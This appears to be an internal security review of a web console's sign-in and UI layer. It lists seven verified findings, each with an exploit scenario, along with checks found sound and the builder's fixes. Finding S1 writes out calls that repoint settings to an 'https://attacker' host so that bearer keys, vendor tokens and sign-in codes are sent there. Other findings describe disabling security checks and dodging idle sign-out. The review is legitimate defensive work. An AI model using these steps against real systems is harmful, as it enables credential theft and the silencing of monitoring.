# Eduwit One — Phase 4 security review (sign-in and UI)

Commit `568f5ae` on branch `claude/festive-babbage-7yhhx8`, reviewed 23 Oct 2026 by a fresh reviewer (spec §16.11).

## Scope and method

I reviewed the phase-4 database layer (`0009_auth.sql`, `0010_ui_read.sql`, `0011_ui_write.sql`, `0012_ui_apps.sql`,
`0013_seed_builder_proposals.sql`, plus the grant model in `0002_core_tables.sql` and `one.redact`/`one.has_contact`
in `0004_events_union.sql`) and the web layer (`middleware.ts`, `app/auth/**`, `app/(auth)/**`, `lib/session.ts`,
`lib/security.ts`, `lib/supabase.ts`, `lib/db.ts`, `lib/env.ts`, `lib/auth.ts`, `lib/clients/credentials.ts`,
`lib/clients/*`, `lib/actions/*`, `lib/ui/api.ts`, `lib/csv.ts`, the two CSV export routes, `components/embeds/json-view.tsx`,
`components/brief/markdown.tsx`, and the machine routes under `app/api/**`). Method: code reading; running
`scripts/db/local-test.sh` (passes as-is); building a throwaway local PostgreSQL 16 cluster from the same stubs + every
migration and running SQL probes as `authenticated` with forged `request.jwt.claims` for an owner, an engineer and an
app user with no `one.users` row (per `supabase/tests/local/70_auth.sql`); exercising the real web clients against a
local HTTP listener; and running the built Next app to inspect headers/CSP and the middleware. No remote database,
connector, service-role key or `SMTP_*` var was touched. Probe scripts are under this folder's `sec4/`.

The core gate is sound: `one.ui_require()` takes the caller only from the signed JWT, every `one.ui_*` / `one.ui_embed`
function begins with it, and an app user with a valid shared-project JWT but no `one.users` row is refused by all 45
authenticated-executable UI functions (only `me()`, `auth_verify_code`, `auth_device_check`, `auth_sign_out` are
reachable, and they leak nothing — verified). The findings below are where the trust boundary between a signed-in
**engineer** and the **owner/the apps' data** leaks, plus two session-revocation/idle gaps.

## Findings

| id | severity | file:line | finding | exploit scenario | suggested fix |
|----|----------|-----------|---------|------------------|---------------|
| S1 | high | `0010_ui_read.sql:312-315` (`setting_owner_only`); `0011_ui_write.sql:159-178` (`ui_settings_put`); consumed by `0003_functions_core.sql:157-179` (`one.job_call`), `web/lib/clients/index.ts:80-92`, `web/app/(auth)/actions.ts:52` | **An engineer can repoint the settings that decide where production credentials and the emailed sign-in code are sent.** `setting_owner_only` only guards `fixes/access/events/proposals/retention/supabase`. `app` (`base_url`), `hosts`, `vendors`, `chatwoot`, `n8n`, `whatsapp` are all writable with `operate` (engineer). The app's service role then sends its Vault-held tokens to whatever base URL these hold: Resend key, Chatwoot token, n8n key, WhatsApp token, Vercel token; `one.job_call` sends `Bearer one_internal_key` to `app.base_url`; and the sign-in code email (`actions.ts` `sendCode`) is POSTed to `vendors.resend_api`. | Engineer signs in, calls `one.ui_settings_put('vendors', {…,"resend_api":"https://attacker/resend",…})` and `('app',{"base_url":"https://attacker"})` (both returned `{ok:true}`). Next minute tick: `one.job_call('/api/internal/tick')` POSTs to `https://attacker/api/internal/tick` with header `authorization: Bearer <one_internal_key>` (observed in `net.http_request_queue`). The real Resend/Chatwoot clients then send `Bearer re_live_…` / `api_access_token: …` and every user's 6-digit code to the attacker host (reproduced with a local listener). | Put credential-routing keys (`app.base_url`, `hosts`, `vendors`, and each `*_api`) behind `one.ui_require('owner')` (extend `setting_owner_only`), or validate them against an allow-list of known Eduwit hosts; never let `operate` change where a secret is sent. | **verified** (probes p2/p2b/p3) |
| S2 | high | `0012_ui_apps.sql:140-172` (`ui_embed`/`ui_marketing` redaction); `0004_events_union.sql:15-74` (`one.has_contact`/`one.redact`); `config/settings.json:182` (PII key list) | **`one.redact()` is the only barrier between the console and raw student contact data, and it has holes that reach the Apps page.** Redaction misses: a phone with 3-3-4 or dotted grouping (`981-112-2334`, `98111.22334`), a phone embedded in free text (`"already in our CRM as 098111 22334 (Asha)"`), a 10-15-digit non-Indian number stored as a JSON number (`971501234567`), and a student name under any key not in the PII list (bare `student`, `counsellor`, `owner`, `assigned_to`). App panels return exactly such shapes: `b2b.alert_feed`/`b2b.command_center` carry alert payloads whose free-text/odd-key fields hold names and phones. | Engineer opens `/apps/b2b`; `one.ui_embed('b2b.alert_feed')` returns `payload.proof.mobile_no = "981-112-2334"` and `payload.reason = "already in our CRM as 098111 22334 (Asha)"` unchanged after redaction (reproduced: `b2b.events` seeded with the production `alert.commission_dispute`/`alert.partner_rejected` shapes). Same for the incident timeline (`one.events`) and `ui_audit`. Spec §2: no raw name/phone outside the apps. | Mask phone-shaped digit runs inside strings on digit count regardless of separators; treat any string value whose key is unknown as untrusted (allow-list panel outputs, or hash/drop name-shaped values); redact numeric phone candidates of 10-15 digits. Re-run the B1 redaction test with dash-grouped and name-key cases. | **verified** (probes p6/p7); mechanism is partly pre-existing (phase-1 M5 "fix"), but phase 4's `ui_embed` is a new live exposure surface |
| S3 | medium | `0012_ui_apps.sql:15-16` (`embed_data` is not `security definer`), `:140-151` (`ui_embed` calls it) | **Direct-table panels run with the definer's (postgres) rights, not the caller's, contradicting D-062 "as the signed-in person".** `ui_embed` is `SECURITY DEFINER` (owner postgres); `embed_data` is plain plpgsql, so it inherits postgres rights. Panels that read app tables directly (`b2c.timers/queues/counsellors`, `witty.outbox/replies/learnings/prompts`, `web.funnel`, `influencer.creators/clicks/outcomes`, `b2b.partners`) therefore bypass each app's RLS and grants. The "needs your access" guarantee only holds for panels that call an app's own JWT-checking `SECURITY DEFINER` function. | Engineer with no b2b/b2c grant: direct `select … from b2c.users` → `permission denied for schema b2c`, but `one.ui_embed('b2c.counsellors')` returns the per-counsellor table; `one.ui_embed('web.overview')` runs the stub as `current_user = postgres` (reproduced p5). Compounds S2: the only PII control on this path is the redactor. | Run `embed_data`'s direct-table reads under the caller's role (e.g. a `SECURITY INVOKER` wrapper, or `set role` to the authenticated grantee), or state in D-062/spec that these aggregates are read as postgres and rely solely on redaction — and then harden redaction (S2). | **verified** (probe p5) |
| S4 | medium | `0011_ui_write.sql:334-344` (`ui_devices_revoke`) vs `:324-327` (`ui_user_put` deactivate) | **"Forget trusted browsers" does not end sessions that already passed the second step.** `ui_devices_revoke` only sets `trusted_devices.revoked_at`; it never deletes `one.session_checks`. A session that was already checked via that device keeps full access until its JWT/`auth.sessions` expires. Only deactivating the whole user (`ui_user_put` active=false) clears `session_checks`. | Owner loses a laptop whose browser was trusted and already signed in. Owner clicks "forget my trusted browsers" (`ui_devices_revoke`). The lost laptop's session still passes `one.ui_require('read')` and reads `ui_shell` afterwards (reproduced p12). The thief keeps the console open for up to the Supabase session lifetime. | Have `ui_devices_revoke` also `delete from one.session_checks where user_id = p_user` (and document that it signs those sessions out), or add a "sign out everywhere" that clears `session_checks` for the user. | **verified** (probe p12) |
| S5 | medium | `web/lib/security.ts:24-25` (`isIdleExpired` returns false when the cookie is absent); `web/middleware.ts:64-69` | **The 12-hour idle sign-out is defeated by dropping one cookie.** Idle state lives only in the `one_seen` cookie; `isIdleExpired(undefined)` returns `false`, so a request that omits `one_seen` is treated as "not idle" and the middleware re-issues a fresh `one_seen`, resetting the clock each request. The Supabase `sb-*` auth cookies carry the actual session. | A user (or someone holding the browser's `sb-*` cookies but not `one_seen`) keeps the session alive indefinitely — up to the Supabase session `not_after` — by deleting `one_seen` before each visit. `one_seen` is httpOnly so not JS-forgeable, but omission is enough (reproduced p8: `undefined → not expired`). The stated "12 hours idle signs out" control is advisory only. | Enforce idle at the authority, not a client cookie: store last-seen server-side (e.g. a `one.session_checks.last_seen_at` the gate checks), or treat a missing `one_seen` on an authenticated request as idle after a grace. | **verified** (probe p8) |
| S6 | medium | `0010_ui_read.sql:24-29` (`proposal_sensitive`); `0011_ui_write.sql:118-154` (`ui_proposal_decide`) | **An engineer can approve owner-reserved security proposals, because the sensitivity rule misses the security categories.** `proposal_sensitive` only flags touches `money/allocation/live_switches/partner_mappings/prompts/versioned_settings` (or a `fix`/`config` with no `touches`). The seeded builder cleanups declare `touches` of `api_keys`, `auth`, `database_security`, `data_retention`, `staging` — none flagged — so they are engineer-approvable. Approving also lets the engineer supply an edited `change` that phase 7 would execute. | Engineer calls `one.ui_proposal_decide(<id>,'approve',…)` and approves "replace the all-scope B2B API key" and "legacy influencer logins: passwords stored unhashed" (`owner_only` reported `false`; reproduced p4). In phase 4 this only records the decision, but it removes the owner's review of security changes and pre-stages an engineer-chosen `change` for later execution. | Add the security touches (`api_keys`, `auth`, `database_security`, `data_retention`, `staging`) to the owner-only set, or make any proposal that touches another app's security/credentials owner-only by default. | **verified** (probe p4) |
| S7 | medium | `0011_ui_write.sql:182-215` (`ui_check_update`); `0003_functions_core.sql:369-381` (`one.close_disabled`); `0011_ui_write.sql:171-173` (non-recipient `alerts` writable) | **An engineer can blind the monitoring console.** With `operate` an engineer can disable any check — including the security/integrity checks `PLAT-07` (new anon/authenticated SECURITY DEFINER function) and `PLAT-08` (lead_intake/columns baseline) — and `one.close_disabled()` then auto-resolves their open incidents as `accepted`. The engineer can also change the non-recipient parts of `alerts` (storm thresholds, digest hour, `channels.email`) to suppress or batch P1 delivery. | Engineer disables `PLAT-07`/`PLAT-08` via `one.ui_check_update(..,{"enabled":false},..)` and the next `close_disabled()` marks their incidents resolved `accepted` "check switched off" (reproduced p9); sets `alerts.channels.email=false` to stop P1 emails (reproduced p2b). A malicious insider hides a new anon-executable definer function or an integrity drift. | Treat the security/integrity checks and `alerts.channels`/storm config as owner-only (or require a second owner approval to disable a `security`/`integrity`-tagged check); keep an un-silenceable meta-alert when such a check is turned off. | **verified** (probes p9/p2b) |

## Checked and found sound

- **The gate (`one.ui_require`).** Caller is taken only from the JWT `sub`/`session_id`; it is the first DECLARE
  initializer of every `one.ui_*`/`one.ui_embed` function (runs before the body, before any default-arg use). An app
  user with a valid shared-project JWT but no active `one.users` row is refused by all 45 authenticated functions;
  only `me()`, `auth_verify_code`, `auth_device_check`, `auth_sign_out` are reachable and leak nothing. `me()` reports
  only the caller's own row, so it is not an enumeration oracle. Owner-only paths (`ui_users`, `ui_secret_put`,
  `ui_baseline_accept`, `ui_user_put`, recipient changes in `alerts`, approving sensitive proposals) correctly reject
  an engineer. Mismatched `sub`/`session_id`, a missing `session_id`, an unchecked session and a revoked `auth.sessions`
  row are all refused.
- **SECURITY DEFINER hygiene.** Every function in schema `one` sets `search_path = ''` except `one.tick_job()`, which
  is not SECURITY DEFINER. No table privileges are granted to `authenticated`/`anon`/`service_role` on `one.*` tables
  (sign-in tables, `users`, `audit` included); RLS is on with no policies, so they are reached only through the
  SECURITY DEFINER API. The dynamic SQL in `embed_data`/`ui_embed` dispatches on a fixed `case` (unknown panel →
  P0002), never interpolating `p_panel`; `q`/key filters in `ui_incidents`/`ui_audit` are parameterised `ilike`, not
  string-built SQL.
- **The 6-digit code.** `sha256(salt||code)` with a per-row random salt; 10-minute expiry; 5 tries per code then dead;
  5 codes/hour/user; `used_at` blocks replay. A code is bound to `(user_id, session_id)` — one issued for one session
  cannot verify another (reproduced). Brute-force ceiling ~25 guesses/hour against 10^6. The non-constant-time hash
  compare is not exploitable (attacker cannot observe the salt or stored hash).
- **Trusted-device cookie.** `one_device` is 128 bits from two UUIDs, stored only as sha256, bound to `user_id` and
  checked against `one.uid()`, httpOnly + secure(prod) + sameSite=lax + path=/. (Revocation gap is S4.)
- **OAuth flow.** Server-side PKCE (verifier in cookie, `skipBrowserRedirect`); domain is re-checked on the server
  from `auth.users.email` after the exchange, not trusted from Google `hd`; a non-allowed or unknown user is signed out
  (`scope:"local"`) and never reaches a checked session. `next` is constrained by `safeNext` (same-origin absolute
  paths only; `//`, `/\`, control chars, over-length, scheme rejected) — no open redirect found.
- **XSS / injection in the UI.** No `dangerouslySetInnerHTML`; the brief Markdown renderer and `JsonView` emit React
  text only; `javascript:` hrefs are blocked by React (verified). CSV export neutralises leading `= + - @ \t \r` and
  quotes/doubles quotes. The analytics export is funnel counts only — no per-lead field. The audit export's
  `before`/`after` are JSON-stringified, quoted and formula-prefixed.
- **Middleware / CSP.** Script nonce is present on every emitted `<script>` with `strict-dynamic`; `connect-src 'self'`,
  `frame-ancestors 'none'`, `object-src 'none'`, `base-uri 'self'`, `upgrade-insecure-requests` in prod (verified on
  the built app). `/api/*` and static paths are excluded from the matcher but `/api/internal/*` self-authenticate and
  the pages re-gate with `requireUser()` server-side; a protected path without a session redirects to `/login`
  (verified), and prefetch requests that skip middleware still hit the server-side gate.
- **Machine routes.** `internalAuthorized` uses `timingSafeEqual` with a length guard and refuses when no key is set;
  public `/api/watchdog` returns only `{ok}` (no ages); `/api/health` reads nothing.
- **Env / secrets.** `lib/env.ts` reads only the `ONE_*` names (never the build env's generic `SUPABASE_*`);
  credentials are never logged; `ui_secret_put` restricts names to `^one_[a-z0-9_]+$`, forbids `one_internal_key`,
  requires the name to be one the Setup catalogue lists, is owner-only, and never returns/audits the value;
  `one.app_secrets()` is service-role only and excludes `one_internal_key`.

### Note (not a finding here)

`ui_setup_validated` records a pass/fail verdict straight from `operate` and enables `setup:<item>` checks; the server
action `validateItem` runs the real probe first, but the RPC itself trusts the caller-supplied `p_ok`, so an engineer
can mark a Setup item "verified" without the probe running (reproduced). In phase 4 this only enables already-seeded
checks and writes an audit row, so I did not raise it to a finding; worth confirming the intent before phase 5 ties
Setup state to anything load-bearing.

## Resolution (builder, 23 Oct 2026)

Each fix has a test in `supabase/tests/local/95_review4.sql` (or `web/lib/security.test.ts` for S5).

| ID | Resolution |
| --- | --- |
| S1 | Fixed: `one.setting_owner_only()` is now an allow-list for engineers (`thresholds`, `checks`, `tests`, `witty`, `analytics`). Every key that decides where a credential, an alert or a code is sent (`app`, `hosts`, `vendors`, `chatwoot`, `n8n`, `whatsapp`, `alerts`), what is spent (`ai`) or kept, or who signs in, is the owner's (D-065) |
| S2 | Fixed for phones and keys; one residual accepted. `one.has_contact()` finds Indian mobiles in any grouping (spaces, dots, dashes, brackets; +91, 0091, 91 or 0 first), any number written with +, and any 10–15-digit run grouped the same way, after blanking dates and times. Numbers of 11–15 digits, and 10 digits from 6, are masked. New PII keys: `student`, `applicant*`, `customer*`, `mobile_*`, `*_mobile`, `whatsapp*`, `*_whatsapp`. Residual: a bare first name in free text with no phone or email next to it cannot be told from other words. It reaches a page only through an app's own admin function, which runs under the caller's JWT and shows them only what that app already shows them (D-062) |
| S3 | Accepted and documented (D-062 corrected): table-reading panels are aggregates (counts, states, partner and counsellor names, cron states) read with Eduwit One's own rights, as the checks read them, and hold no student field by construction; only Eduwit One staff can open them. Panels that call an app's function run under the caller's JWT |
| S4 | Fixed: "Sign out everywhere" (`one.ui_devices_revoke`) forgets the trusted browsers and deletes every other checked session of that person; the caller's own session stays |
| S5 | Fixed: the idle cookie holds the time and an HMAC (key `ONE_INTERNAL_KEY`) of the session id and time. A missing, forged or other-session cookie counts as idle, except within 10 minutes of the sign-in itself (the JWT's `amr` time, which a refresh does not move) |
| S6 | Fixed: touches `api_keys`, `credentials`, `auth`, `auth_settings`, `database_security`, `data_retention`, `staging` and `security` need the owner, as do all `fix` and `config` proposals (M5) |
| S7 | Fixed: switching off, or lowering the severity of, a P1 check, an integrity check or one tagged security, integrity, money or consent needs the owner (PLAT-08 is now tagged integrity); `alerts` is owner-only as a whole. Mutes stay with engineers: they are time-boxed, shown on every page, and incidents still record under them |
| Note | Fixed with m6 of the phase review: only the service role records a Setup validation |
